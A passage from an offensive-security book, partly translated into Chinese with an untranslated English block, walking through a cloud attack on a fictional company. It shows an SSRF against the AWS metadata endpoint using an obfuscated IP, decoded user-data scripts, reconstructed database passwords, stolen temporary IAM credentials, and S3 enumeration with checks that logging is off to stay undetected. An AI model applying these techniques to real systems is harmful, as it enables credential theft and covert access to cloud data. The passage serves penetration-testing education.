       name: define-region-params.service
`--snip--`
```

列表 5-6：似乎与*env.file*交互的发现服务

这个脚本很可能会创建*env.file*。让我们深入了解三行之后创建的*get-region-params.sh*的内容（见列表 5-7）。

```
`--snip--`
write_files:
1 - content: H4sIAAAAAAAC/7yabW/aShbH3/tTTFmu0mjXOIm6lXoj98qAQ6wSG9lOpeyDrME+...
  encoding: gzip+base64
  path: /conf_files/define-region-params.sh
```

列表 5-7：负责在*user-data*脚本中创建*get-region-params.sh*的行

我们还有一个编码的二进制数据 1。通过使用一些`base64`和`gunzip`技巧，我们将这堆垃圾转换为一个普通的 bash 脚本，该脚本定义了各种端点、用户名以及其他参数，具体取决于机器运行的区域（请参见列表 5-8）。我将跳过许多条件分支和 case 语句，只打印相关部分。

```
root@Point1:~/# echo H4sIAAA...|base64 -d |gunzip

AZ=$(curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone)
REGION=${AZ%?}

case $REGION in
  ap-southeast-1...
    ;;
  eu-west-1
    echo "S3BUCKET=mxrads-dl" >> /etc/env.file 1
 echo "S3MISC=mxrads-misc" >> /etc/env.file 2
    echo "REDIS_GEO_HOST=redis-geolocation.production.euw1.mxrads.tech" >> /etc/env.file
    echo "CASSA_DC=eu-west-delivery" >> /etc/env.file
    echo "CASSA_USER_SYNC=usersync-euw1" >> /etc/env.file
    echo "CASSA_USER_DLVRY=userdc-euw1" >> /etc/env.file

`--snip--`
cassandra_delivery_host="cassandra-delivery.prod.${SHORT_REGION}.mxrads.tech"
`--snip--`
```

列表 5-8：解码后的*get-region-params.sh*脚本片段

请注意我们在侦查过程中遇到的 S3 存储桶 mxrads-dl 1 和 mxrads-misc 2。

看着这个脚本，我们可以看到实例正在使用元数据 API 来检索它自己的区域并基于这些信息构建端点和用户名。这是公司朝着基础设施弹性迈出的第一步：它打包了一个应用，甚至是一个环境，能够在任何虚拟化管理程序、任何数据中心、任何国家/地区运行。无疑是强大的东西，但有个警告——正如我们亲眼所见，简单的 SSRF 漏洞可能暴露应用程序的所有秘密给任何愿意尝试的人。

通过交叉引用这个文件与我们从列出 5-5 获取的密码，并根据变量名进行合理推测，我们可以重建以下凭证：

**cassandra-delivery.prod.euw1.mxrads.tech**

1.  用户名：userdc-euw1

1.  密码：gQMUUHsVuuUyo003jqFU

**cassandra-usersync.prod.euw1.mxrads.tech**

1.  用户名：usersync-euw1

1.  密码：QZ6bhOWiCprQPetIhtSv

有些机器缺少用户名，其他密码也缺少相应的主机名，但我们会在时间中慢慢搞清楚。目前，这是我们可以完全整理出来的所有内容。

有了这些信息，唯一阻止我们访问这些数据库的就是基本的、防火墙规则。这些端点解析到内部 IP 地址，无法从我们攻击服务器所在的互联网角落访问，因此除非我们想出改变这些防火墙规则或完全绕过它们的方法，否则我们将被一堆无用的凭证卡住。

好吧，这并不完全正确。我们还没有获取到一组凭证，与之前的凭证不同，它通常不受 IP 限制：机器的 IAM 角色。

在大多数云服务提供商中，你可以为机器分配一个*角色*，这是一组默认凭证。这样机器就能够无缝地进行云提供商身份验证，并继承分配给该角色的任何权限。任何在机器上运行的应用或脚本都可以声明该角色，这样就避免了在代码中硬编码密钥的糟糕习惯。看起来完美……再次强调，仅仅是纸面上的完美。

实际上，当 EC2 机器（或者更准确地说，是实例配置文件） impersonates IAM 角色时，它会获取一组临时凭证，代表该角色的权限。这些凭证通过——你猜对了——元数据 API 提供给机器。

我们调用*/latest/meta-data/iam/security-credentials* 端点来检索该角色的名称：

```
http://0xa9fea9fe/latest/meta-data/iam/security-credentials
demo-role.ec2
```

我们可以看到该机器被分配了 demo-role.ec2 角色。让我们再次通过调用元数据 API 来获取它的临时凭证：

```
# Credentials
http://0xa9fea9fe/latest/meta-data/iam/security-credentials/demo-role.ec2

{
 Code : Success,
 LastUpdated : 2020-10-26T11:33:39Z,
 Type : AWS-HMAC,
 **AccessKeyId : ASIA44ZRK6WS4HX6YCC7,**
 SecretAccessKey : nMylmmbmhHcOnXw2eZ3oh6nh/w2StPw8dI5Mah2b,
 Token : AgoJb3JpZ2luX2VjEFQ...
 Expiration : 2020-10-26T17:53:41Z 1
}
```

我们得到了`AccessKeyId`和`SecretAccessKey`，它们共同构成了经典的 AWS API 凭证，以及一个验证这组临时凭证的访问令牌。

理论上，我们可以将这些密钥加载到任何 AWS 客户端，并通过机器的身份：demo-role.ec2，在世界上任何 IP 上与 MXR Ads 的账户进行交互。如果该角色允许机器访问 S3 存储桶，那么我们就可以访问这些存储桶。如果机器可以终止实例，那么我们也可以。我们可以接管该实例的身份和权限，在凭证被重置之前的六个小时内继续使用。

当这个宽限期到期后，我们可以再次检索到一组新的有效凭证。现在你明白为什么 SSRF 是我新最好的朋友了。在这里，我们将 AWS 凭证注册在主目录下，配置文件名称为 `demo`：

```
# On our attacking machine
root@Point1:~/# vi ~/.aws/credentials
[demo]
aws_access_key_id = ASIA44ZRK6WSX2BRFIXC
aws_secret_access_key = +ACjXR87naNXyKKJWmW/5r/+B/+J5PrsmBZ
aws_session_token = AgoJb3JpZ2l...
```

看起来我们有了突破！不幸的是，就在我们开始紧握目标时，AWS 又给我们带来了新的挑战：IAM。

### AWS IAM

AWS IAM 是身份验证和授权服务，它可能是一个非常复杂的系统。默认情况下，用户和角色几乎没有任何权限。他们无法看到自己的信息，如用户名或访问密钥 ID，因为即使是这些简单的 API 调用也需要明确的权限。

显然，像开发人员这样的普通 IAM 用户拥有一些基本的自查权限，使他们可以列出自己的组成员身份，但对于附加到机器的实例角色来说情况就完全不同了。当我们尝试获取关于角色 demo-role-ec2 的基本信息时，出现了一个令人震惊的错误：

```
# On our attacking machine
root@Point1:~/# 
```

`aws iam get-role \`

```
**--role-name demo-role-ec2 \**
**--profile demo**

An error occurred (AccessDenied) when calling the GetRole operation: User:
arn:aws:sts::886371554408:assumed-role/demo-role.ec2/i-088c8e93dd5703ccc
is not authorized to perform: iam:GetRole on resource: role demo-role-ec2
```

一个应用程序通常不会在运行时评估它的权限集；它只会执行代码所规定的 API 调用并相应地操作。这意味着我们拥有有效的 AWS 凭证，但目前我们完全不知道如何使用它们。

我们需要做一些研究。几乎每个 AWS 服务都有一些 API 调用，用来描述或列出其所有资源（EC2 的 `describe-instances`、S3 的 `list-buckets` 等等）。因此，我们可以慢慢开始探测最常用的服务，看看我们可以用这些凭证做什么，然后逐步测试 AWS 的各种服务。

````One option is to go nuts and try every possible AWS API call (there are thousands) until we hit an authorized query, but the avalanche of errors we’d trigger in the process would knock any security team out of their hibernal sleep. By default, most AWS API calls are logged, so it’s quite easy for a company to set up alerts tracking the number of unauthorized calls. And why wouldn’t they? It literally takes a few clicks to set up these alerts via the monitoring service CloudWatch.    Plus, AWS provides a service called GuardDuty that automatically monitors and reports all sorts of unusual behaviors, such as spamming 5,000 API calls, so caution is paramount. This is not your average bank with 20 security appliances and a $200K/year outsourced SOC team that still struggles to aggregate and parse Windows events. We need to be clever and reason about it purely from context.    For instance, remember that mxrads-dl S3 bucket that made it to this instance’s *user-data*? We could not access that before without credentials, but maybe the demo-role.ec2 role has some S3 privileges that could grant us access? We find out by calling on the AWS API to list MXR Ads’ S3 buckets:    ``` # On our attacking machine root@Point1:~/# aws s3api listbuckets --profile demo An error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied ```    Okay, trying to list all S3 buckets in the account was a little too bold, but it was worth a shot. Let’s take it back and take baby steps now. Again using the demo-role.ec2 role, we try just listing keys inside the mxrads-dl bucket. Remember, we were denied access earlier without credentials:    ``` root@Point1:~/# aws s3api list-objects-v2 --profile demo --bucket mxrads-dl > **list_objects_dl.txt** root@Point1:~/# grep '"Key"' list_objects_dl | sed 's/[",]//g' > **list_keys_dl.txt**  root@Point1:~/# head list_keys_dl.txt   Key: jar/maven/artifact/com.squareup.okhttp3/logging-interceptor/4.2.2   Key: jar/maven/artifact/com.logger.log/logging-colors/3.1.5 `--snip--` ```    Now we are getting somewhere! We get a list of keys and save them away. As a precaution, before we go berserk and download every file stored in this bucket, we can make sure that logging is indeed disabled on S3 object operations. We call the `get-bucket-logging` API:    ``` root@Point1:~/# aws s3api get-bucket-logging --profile demo --bucket mxrads-dl  <empty_response> ```    And we find it’s empty. No logging. Perfect. You may be wondering why a call to this obscure API succeeded. Why would an instance profile need such a permission? To understand this weird behavior, have a look at the full list of possible S3 operations at [`docs.aws.amazon.com/`](https://docs.aws.amazon.com/). Yes, there are hundreds of operations that can be allowed or denied on a bucket.    AWS has done a spectacular job defining very fine-grained permissions for each tiny and sometimes inconsequential task. No wonder most admins simply assign wildcard permissions when setting up buckets. A user needs read-only access to a bucket? A `Get*` will do the job; little do they realize that a `Get*` implies 31 permissions on S3 alone! `GetBucketPolicy` to get the policy, `GetBucketCORS` to return CORS restrictions, `GetBucketACL` to get the access control list, and so forth.    Bucket policies are mostly used to grant access to foreign AWS accounts or add another layer of protection against overly permissive IAM policies granted to users. A user with an `s3:*` permission could therefore be rejected with a bucket policy that only allows some users or requires a specific source IP. Here we attempt to get the bucket policy for mxrads-dl to see if it does grant access to any other AWS accounts:    ``` root@Point1:~/# aws s3api get-bucket-policy --bucket mxrads-dl {   "Id": "Policy1572108106689",   "Version": "2012-10-17",   "Statement": [       {          "Sid": "Stmt1572108105248",          "Action": [              "s3:List*", " s3:Get*"          ],          "Effect": "Allow",          "Resource": "arn:aws:s3:::mxrads-dl",          "Principal": {            1 "AWS": "arn:aws:iam::983457354409:root"          }    }] } ```    This policy references the foreign AWS account 983457354409 1. This account could be Gretsch Politico, an internal MXR Ads department with its own AWS account, or a developer’s personal account for that matter. We cannot know for sure, at least not yet. We’ll note it for later examination.    ### Examining the Key List    We go back to downloading the bucket’s entire key list and dive into the heap, hoping to find sensitive data and get an idea of the bucket’s purpose. We have an impressive number of public binaries and *.jar* files. We find a collection of the major software players with different versions, such as Nginx, Java collections, and Log4j. It seems they replicated some sort of public distribution point. We find a couple of bash scripts that automate the `docker login` command or provide helper functions for AWS commands, but nothing stands out as sensitive.    From this, we deduce that this bucket probably acts as a corporate-wide package distribution center. Systems and applications must use it to download software updates, packages, archives, and other widespread packages. I guess not every public S3 is an El Dorado waiting to be pilfered.    We turn to the *user-data* script we pulled earlier hoping for additional clues about services to query, but find nothing out of note. We even try a couple of AWS APIs with the demo role credentials to common services like EC2, Lambda, and Redshift out of desperation, only to get that delicious error message back. How frustrating it is to have valid keys yet stay stranded at the front door simply because there are a thousand keyholes to try . . . but that’s just the way it is sometimes.    As with most dead ends, the only way forward is to go backward, at least for a while. It’s not like the data we gathered so far is useless; we have database and AWS credentials that may prove useful in the future, and most of all, we gained some insight into how the company handles its infrastructure. We only need a tiny spark to ignite for the whole ranch to catch fire. We still have close to a hundred domains to check. We will get there.    ## Resources    *   See this short introduction to Burp if you are not familiar with the tool: [`bit.ly/2QEQmo9`](http://bit.ly/2QEQmo9)*.* *   Check out the progressive capture-the-flag exercises at [`flaws.cloud/`](http://flaws.cloud/) to get you acquainted with basic cloud-hacking reflexes. *   CloudBunny and fav-up are tools that can help you bust out the IP addresses of services hiding behind CDNs: [`github.com/Warflop/CloudBunny/`](https://github.com/Warflop/CloudBunny/)and [`github.com/pielco11/fav-up/`](https://github.com/pielco11/fav-up/)*.* *   You can read more about techniques to uncover bucket names at the following links: [`bit.ly/36KVQn2`](http://bit.ly/36KVQn2) and [`bit.ly/39Xy6ha`](http://bit.ly/39Xy6ha). *   The difference between CNAME and ALIAS records is discussed at [`bit.ly/2FBWoPU`](http://bit.ly/2FBWoPU). *   This website lists a number of open S3 buckets if you’re in for a quick hunt: [`buckets.grayhatwarfare.com/`](https://buckets.grayhatwarfare.com/)*.* *   More information on S3 bucket policies can be found here: [`amzn.to/2Nbhngy`](https://amzn.to/2Nbhngy)*.* *   Further reading on WebSockets is available at [`bit.ly/35FsTHN`](http://bit.ly/35FsTHN). *   Check out this blog about IMDSv2: [`go.aws/35EzJgE`](https://go.aws/35EzJgE).````*
